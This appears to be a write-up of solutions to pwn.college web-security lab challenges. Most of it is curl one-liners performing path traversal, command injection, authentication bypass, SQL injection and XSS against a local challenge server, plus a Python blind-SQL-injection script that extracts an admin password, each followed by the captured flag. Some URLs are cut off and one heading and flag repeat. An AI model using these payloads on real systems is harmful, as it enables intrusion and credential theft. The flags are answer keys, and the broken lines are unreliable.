# Web Security

Solutions to web security challenges using the commandline

## Path Traversal 1

```bash
curl --path-as-is "http://challenge.localhost/package/../../flag"
```
pwn.college{oueKOcA8sNYfpdjGoSxNzsfEs1d.ddDOzMDL5ETN1QzW}


## Path Traversal 2

```bash
curl --path-as-is "http://challenge.localhost/deliverables/fortunes/../../../flag"
```

pwn.college{cwIKmmwFzsfDTl3NF7NKgzQy6Fj.dJjN1YDL5ETN1QzW}


## CMDi 1

```bash
curl "http://challenge.localhost/checkpoint?root=%26cat%20/flag"
```

pwn.college{4ybvnKvITMP8jZee7xbFwBnEZyy.dVjN1YDL5ETN1QzW}


## CMDi 2

```bash
curl "http://challenge.localhost/checkpoint?folder=%26cat%20/flag"
```

pwn.college{8Ece3608TlTjvsSEQOaKTxINgxz.dRjN1YDL5ETN1QzW}


## CMDi 3

```bash
curl "http://challenge.localhost/quest?path=/'%26cat%20'/flag"
```

pwn.college{IAzfFj-BONGXN7XNj9XHiEkajYY.dZjN1YDL5ETN1QzW}


## CMDi 4

```bash
curl "http://challenge.localhost/event?time-zon=MST%20date%26cat%20/flag%26"
```

pwn.college{gBDmnKBaP1AjJ_iM1bRhdbOcUS-.dhDOzMDL5ETN1QzW}


## CMDi 5

```bash
curl "http://challenge.localhost/mission?full-path=%26cat%20/flag>flag"
```

pwn.college{UCPh8xvJDNnfdofq0YmQFsH1B2Q.ddjN1YDL5ETN1QzW}


## CMDi 6

Use newline char to run as two separate commands: **`%0a`**

```bash
curl "http://challenge.localhost/adventure?directory-path=%0acat%20/flag"
```

pwn.college{4hPnSLHoico5F1K2Tk4_xyxPVnA.dRzN1YDL5ETN1QzW}


## Authentication Bypass 1

```bash
curl "http://challenge.localhost/?session_user=admin"
```

pwn.college{c0Cpdut90rSyMEuIA83tbKLBvFn.dlDOzMDL5ETN1QzW}


## Authentication Bypass 2

```bash
curl -b "session_user=admin" "http://challenge.localhost/"
```

pwn.college{otLQb8T1qqVibXbzo1IuZzPJSCy.dJzN1YDL5ETN1QzW}


## SQLi 1

```bash
curl -c cookies.txt -X POST http://challenge.localhost/authentication -d "user-handle=admin&pin=1 OR 1=1"
curl -b cookies.txt http://challenge.localhost/authentication
```

pwn.college{gaRlBENzFTohvswxxyMqbglEBML.dNzN1YDL5ETN1QzW}


## SQLi 2

Escape and inject:

```bash
curl -c cookies.txt -X POST http://challenge.localhost/logon -d "userid=admin&account-password=1' OR '1'='1"
curl -b cookies.txt http://challenge.localhost/logon
```

pwn.college{QIj_7-GyKdDlTQvOKwe25QqKshQ.dBTOzMDL5ETN1QzW}


## SQLi 3

Use **`UNION`**:

```bash
curl "http://challenge.localhost/?query=%22%20OR%201%3D1%20UNION%20SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27%20--"
```

pwn.college{4MtDhYlv1kgW7p-o89NkroVeHmS.dFTOzMDL5ETN1QzW}


## SQLi 4

Read master list of table names, then get dig into that table:

" UNION SELECT name FROM sqlite_master WHERE type='table' --

```bash
curl "http://challenge.localhost/?query=%22%20OR%201%3D1%20UNION%20SELECT%20name%20FROM%20sqlite_master%20WHERE%20type%3D%27table%2
curl "http://challenge.localhost/?query=%22%20OR%201%3D1%20UNION%20SELECT%20password%20FROM%20users_6569529725%20WHERE%20username%3
D%27admin%27%20--"
```

pwn.college{ElXqyq0xQuimm2g2VNo25TqtdQO.dJTOzMDL5ETN1QzW}


## SQLi 4

Brute force one letter at the time checking half alphabet each request

```py
#!/usr/bin/env python3
import requests
import string

BASE_URL = "http://challenge.localhost/"
USERNAME = "admin"
MAX_PASSWORD_LENGTH = 57  # longer since password may contain symbols

def extract_password():
    printable_chars = [c for c in string.printable if c not in string.whitespace or c == ' ']

    def check_injection(chars, position):
        # Escape single quotes in chars for safety
        escaped_chars = [c.replace("'", "''") for c in chars]
        chars_list = "', '".join(escaped_chars)
        injection = f"' OR (username = '{USERNAME}' AND SUBSTR(password, {position}, 1) IN ('{chars_list}')) -- "
        data = {
            "username": USERNAME,
            "password": injection
        }
        response = requests.post(BASE_URL, data=data)
        return response.status_code == 200

    password = ""

    for pos in range(1, MAX_PASSWORD_LENGTH + 1):
        candidates = printable_chars.copy()

        while len(candidates) > 1:
            mid = len(candidates) // 2
            left = candidates[:mid]
            right = candidates[mid:]

            if check_injection(left, pos):
                candidates = left
            else:
                candidates = right

        char = candidates[0]
        if check_injection([char], pos):
            password += char
            print(f"Found character {pos}: {repr(char)}")
        else:
            print(f"Password found: {password}")
            return password

    print(f"Password found (max length reached): {password}")
    return password

if __name__ == "__main__":
    extract_password()
```

pwn.college{ElXqyq0xQuimm2g2VNo25TqtdQO.dJTOzMDL5ETN1QzW}


## XSS 1

```bash
curl "http://challenge.localhost" -d "content=<input>"
```

then run the victims script to check to see if he gets our html:

```bash
./victim
```

pwn.college{gXXTEtO0VaLz4b_py4ji5hxxVZZ.dVzN1YDL5ETN1QzW}